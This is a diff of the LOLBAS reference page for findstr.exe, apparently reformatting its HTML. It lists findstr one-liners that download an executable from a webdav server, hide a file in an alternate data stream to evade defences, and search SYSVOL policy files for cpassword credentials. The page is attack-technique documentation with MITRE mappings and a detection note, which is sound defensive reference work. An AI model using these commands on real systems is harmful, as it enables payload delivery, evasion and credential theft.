@@ -28,19 +28,23 @@
     </div>
 </h1>
 
-
 <ul class="function-list">
-    
-    
-    <li><a href="/lolbas/Binaries/Findstr/#download">Download</a></li>
-    
-    
-    <li><a href="/lolbas/Binaries/Findstr/#credentials">Credentials</a></li>
-    
-    
-    <li><a href="/lolbas/Binaries/Findstr/#ads">Alternate data streams</a></li>
-    
+	
+	
+	
+	<li><a href="/lolbas/Binaries/Findstr/#ads">Alternate data streams</a></li>
+	
+	
+	<li><a href="/lolbas/Binaries/Findstr/#credentials">Credentials</a></li>
+	
+	
+	<li><a href="/lolbas/Binaries/Findstr/#download">Download</a></li>
+	
 </ul>
+
+	
+
+
 
 
 
@@ -56,136 +60,106 @@
 </p>
 <br>
 <b>Resources:</b> 	
-	<ul style="list-style-type:none">
+<br>
 	
-	<li><a href="https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/">https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/</a></li>
+	<a href="https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/">https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/</a>
+	<br>
 	
-	<li><a href="https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f">https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f</a></li>
+	<a href="https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f">https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f</a>
+	<br>
 	 
-	</ul>
 <br>
 <p><b>Acknowledgement:</b> 
-	<ul style="list-style-type:none">
+<br>
 	
-	<li>Oddvar Moe - <a href="https://twitter.com/@oddvarmoe">@oddvarmoe</a </li>
+	Oddvar Moe - <a href="https://twitter.com/@oddvarmoe">@oddvarmoe</a>
+	<br>
 	 
-	</ul>
 </p>
 <br>
-<p><b>Detection:</b> 
-	<ul style="list-style-type:none">
+<p><b>Detection:</b>
+<br>
 	
-	<li>finstr.exe should normally not be invoked on a client system</li>
+	finstr.exe should normally not be invoked on a client system
+	<br>
 	 
-	</ul>
 </p>
 <br>
 <br>
 
 
 
-
-
-
-<h2 id="download" class="function-name">Download</h2>
-
-<p>The LOLBAS can download files.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is downloaded to the target file.</p>
-
-		Usecase:Download/Copy file from webdav server
-        <pre><code>findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.exe</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1185">T1185</a></li>
-	<br><br>	
-    
-
-</ul>
-<br><br>
-
-
-
-
-
-<h2 id="credentials" class="function-name">Credentials</h2>
-
-<p>The LOLBAS can view credentials file.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Search for stored password in Group Policy files stored on SYSVOL.</p>
-
-		Usecase:Find credentials stored in cpassword attrbute
-        <pre><code>findstr /S /I cpassword \\sysvol\policies\*.xml</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1081">T1081</a></li>
-	<br><br>	
-    
-
-</ul>
-<br><br>
-
-
-
-
-
-<h2 id="ads" class="function-name">Alternate data streams</h2>
-
-<p>The LOLBAS can write or read alternate data streams.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.</p>
-
+	
+<h2 id="ads" class ="function-name">Alternate data streams</h2>
+	
+		Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.
+		<br>
+		<pre><code>findstr /V /L W3AllLov3DonaldTrump c:\ADS\file.exe > c:\ADS\file.txt:file.exe</code></pre>
 		Usecase:Add a file to an alternate data stream to hide from defensive counter measures
-        <pre><code>findstr /V /L W3AllLov3DonaldTrump c:\ADS\file.exe > c:\ADS\file.txt:file.exe</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1096">T1096</a></li>
-	<br><br>	
-    
-
-
-
-    <li>
-        <p>Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.</p>
-
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1096">T1096</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.
+		<br>
+		<pre><code>findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.txt:file.exe</code></pre>
 		Usecase:Add a file to an alternate data stream from a webdav server to hide from defensive counter measures
-        <pre><code>findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.txt:file.exe</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1096">T1096</a></li>
-	<br><br>	
-    
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1096">T1096</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
-</ul>
-<br><br>
+	
+<h2 id="credentials" class ="function-name">Credentials</h2>
+	
+		Search for stored password in Group Policy files stored on SYSVOL.
+		<br>
+		<pre><code>findstr /S /I cpassword \\sysvol\policies\*.xml</code></pre>
+		Usecase:Find credentials stored in cpassword attrbute
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1081">T1081</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+
+	
+<h2 id="download" class ="function-name">Download</h2>
+	
+		Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is downloaded to the target file.
+		<br>
+		<pre><code>findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.exe</code></pre>
+		Usecase:Download/Copy file from webdav server
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1185">T1185</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
         <script>
          // add permalink on headings
